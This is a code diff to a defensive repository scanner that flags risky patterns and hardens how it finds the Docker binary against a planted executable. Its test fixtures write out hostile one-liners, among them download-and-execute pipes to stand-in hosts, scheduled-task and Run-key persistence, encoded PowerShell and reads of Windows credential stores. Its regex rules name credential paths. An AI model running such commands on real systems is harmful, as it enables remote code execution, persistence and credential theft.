@@ -8,6 +8,7 @@ Check:   python3 sniff.py --test
 import json
 import os
 import re
+import shutil
 import subprocess
 import sys
 import tempfile
@@ -23,19 +24,20 @@ RULES = [
      r"(?i:\b(iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n|]*\|\s*(iex|invoke-expression)\b"
      r"|\b(iex|invoke-expression)\b[^\n]*\.download(string|data)\()"),
     ("encoded-powershell", "HIGH", "runs base64-encoded PowerShell you can't read",
-     r"(?i:\b(powershell|pwsh)(\.exe)?\b[^\n]*\s-(e|ec|enc|encodedcommand)\s)"),
+     # PowerShell takes any prefix of -EncodedCommand, `/` for `-`, and en/em dashes; -Ex... is ExecutionPolicy.
+     r"(?i:\b(powershell|pwsh)(\.exe)?\b[^\n]*\s[-/\u2013\u2014]e(?!x)[a-z]*\s)"),
     ("shell-profile", "HIGH", "edits shell startup files (persistence, PATH hijack)",
      r"\.(zshrc|bashrc|bash_profile|zprofile|zshenv)\b|(?i:powershell_profile\.ps1|\$profile\b)"),
     ("windows-persistence", "HIGH", "installs something that survives reboot on Windows",
-     r"(?i:\\currentversion\\run(once)?\b|\bschtasks(\.exe)?\s+/create\b|\bregister-scheduledtask\b"
-     r"|\\start menu\\programs\\startup|\bnew-service\b|\bsc(\.exe)?\s+create\b)"),
+     r"(?i:[/\\]currentversion[/\\]run(once)?\b|\bschtasks(\.exe)?\s+/create\b|\bregister-scheduledtask\b"
+     r"|[/\\]start menu[/\\]programs[/\\]startup|\bnew-service\b|\bsc(\.exe)?\s+create\b)"),
     ("toolchain-shim", "HIGH", "touches pyenv/nvm/rbenv shims (the pyenv swap trick)",
      r"\.pyenv|[/\\]shims[/\\]|\.nvm[/\\]|\.rbenv|\.asdf[/\\]"),
     ("persistence", "HIGH", "installs something that survives reboot",
      r"LaunchAgents|LaunchDaemons|crontab\s|systemctl\s+enable"),
     ("credential-path", "HIGH", "reads secrets: SSH keys, cloud, kube, docker, keychain",
      r"\.ssh[/\\]|\.aws[/\\]credentials|\.kube[/\\]config|\.docker[/\\]config\.json|Keychains|\.netrc|\.npmrc"
-     r"|(?i:\\microsoft\\(credentials|protect)\\|\blogin data\b)"),
+     r"|(?i:[/\\]microsoft[/\\](credentials|protect)[/\\]|\blogin data\b)"),
     ("decode-exec", "MEDIUM", "decodes hidden data (common obfuscation)",
      r"base64\s+(-d|--decode)|b64decode\(|atob\(|Buffer\.from\([^)]*base64|fromhex\("),
     ("dynamic-exec", "MEDIUM", "runs code built at runtime",
@@ -194,16 +196,31 @@ def path_ok(path):
     return ":" not in os.path.splitdrive(os.path.abspath(path))[1]
 
 
+def resolve_docker(target):
+    """Absolute path to docker, never from the scanned repo or the cwd. On Windows a bare "docker"
+    also searches the current directory, so a repo shipping docker.exe would run unsandboxed."""
+    exe = shutil.which("docker")
+    if not exe or not os.path.isabs(exe):
+        return None
+    exe = os.path.realpath(exe)
+    for unsafe in (os.path.realpath(target), os.path.realpath(os.getcwd())):
+        if os.path.commonpath([exe, unsafe]) == unsafe:
+            return None
+    return exe
+
+
 def run(path, cmd):
     if not path_ok(path):
         sys.exit("path contains ':'; rename it first")
     main(path)
     print(f"\nOpening sandbox (no network, read-only, throwaway copy): {cmd}\n", file=sys.stderr)
-    argv = sandbox_cmd(path, cmd, sys.stdin.isatty())
-    try:  # subprocess, not os.exec*: exec doesn't replace the process on Windows
-        sys.exit(subprocess.call(argv))
-    except FileNotFoundError:
-        sys.exit("docker not found; install Docker Desktop or run the command in README by hand")
+    docker = resolve_docker(path)
+    if not docker:
+        sys.exit("docker not found on PATH (outside this folder); install Docker Desktop")
+    argv = [docker] + sandbox_cmd(path, cmd, sys.stdin.isatty())[1:]
+    # subprocess, not os.exec*: exec doesn't replace the process on Windows. Neutral cwd: nothing
+    # docker loads relative to it can come from the scanned repo.
+    sys.exit(subprocess.call(argv, cwd=os.path.expanduser("~")))
 
 
 def main(root):
@@ -229,6 +246,8 @@ def test():
             "clean.py": "print('hello world')\n",
             "setup.ps1": "iwr https://x.example/a.ps1 | iex\nschtasks /create /tn x /tr evil.exe\n",
             "run.bat": "powershell -enc SQBFAFgA\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x\n",
+            "enc2.ps1": "pwsh /EncodedC SQBFAFgA\nPowerShell -ExecutionPolicy Bypass -File ok.ps1\n",
+            "fwd.ps1": "New-ItemProperty HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name x\n",
             "loot.ps1": "gc $env:APPDATA\\Microsoft\\Credentials\\x\nAdd-Content $PROFILE 'evil'\n",
             "tool": "\x7fELF rest",
             "straddle.sh": "curl -s https://x.example/p \x0c| sh\n",
@@ -254,10 +273,22 @@ def test():
                          ("git-pointer", "sub/.git"), ("pipe-to-shell", "fake.png"),
                          ("ps-download-exec", "setup.ps1"), ("windows-persistence", "setup.ps1"),
                          ("encoded-powershell", "run.bat"), ("windows-persistence", "run.bat"),
-                         ("credential-path", "loot.ps1"), ("shell-profile", "loot.ps1")]:
+                         ("credential-path", "loot.ps1"), ("shell-profile", "loot.ps1"),
+                         ("encoded-powershell", "enc2.ps1"), ("windows-persistence", "fwd.ps1")]:
             assert expected in ids, (expected, ids)
         assert not any(where == "clean.py" for _, where in ids), ids
         assert not any(rid == "npm-install-hook" and "jest" in why for _, rid, _, why in scan(d))
+        enc = [f[2] for f in scan(d) if f[1] == "encoded-powershell"]
+        assert "enc2.ps1:2" not in enc and "enc2.ps1:1" in enc, enc  # -ExecutionPolicy isn't -EncodedCommand
+        planted = os.path.join(d, "docker.exe" if os.name == "nt" else "docker")
+        with open(planted, "w") as f:
+            f.write("#!/bin/sh\n")
+        os.chmod(planted, 0o755)
+        old_path, os.environ["PATH"] = os.environ.get("PATH", ""), d + os.pathsep + os.environ.get("PATH", "")
+        try:
+            assert resolve_docker(d) != os.path.realpath(planted), "planted docker in the repo was trusted"
+        finally:
+            os.environ["PATH"] = old_path
         assert sum(f[1] == "git-config-exec" for f in scan(d)) == 7  # one-line, 2 continued, include, alias, ext::, quoted EXT::; not name = x or https url
     assert "\x1b" not in clean("evil\x1b[2J.sh") and "\\x1b" in clean("evil\x1b[2J.sh")
     argv = sandbox_cmd("x", "make test")
